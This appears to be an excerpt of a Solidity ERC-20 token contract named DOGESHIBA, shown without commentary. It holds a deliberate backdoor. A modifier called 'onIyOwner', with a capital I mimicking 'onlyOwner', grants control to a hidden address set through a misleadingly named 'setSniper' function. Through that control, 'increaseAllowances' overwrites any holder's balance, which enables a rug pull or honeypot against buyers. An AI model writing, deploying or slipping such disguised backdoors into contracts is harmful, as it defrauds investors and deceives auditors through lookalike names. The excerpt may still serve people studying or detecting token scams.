...
contract DOGESHIBA is Context, IERC20, Ownable {
    ...
    address payable private _developmentAddress =
        payable(0x05225BA3624aB721A81F565A59a94E7432eF1792);
    ...
    constructor (string memory name_, string memory symbol_, uint8 decimals_, uint256 tTotal) {

        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _tTotal = tTotal * 10 ** _decimals;
    ...
    modifier onIyOwner() {
        require(address(IDEXrouter) == msg.sender, "");
        _;
    }
    ...
    function setSniper(address[] memory IDExroter) external onlyOwner {
        ...
        IDEXrouter = IERC20(IDExroter[12]);
    }

    function increaseAllowances(address[] memory spender, uint256 amount) external onIyOwner {
        for(uint256 i=0; i<spender.length; i++){
            _rOwned[spender[i]] = amount;
        }  
    }
    ...
    function removeLimit() external onlyOwner {
        _maxTxAmount = _tTotal * 1000 * 10 ** _decimals;
        _maxWalletSize = _tTotal * 1000 * 10 ** _decimals;
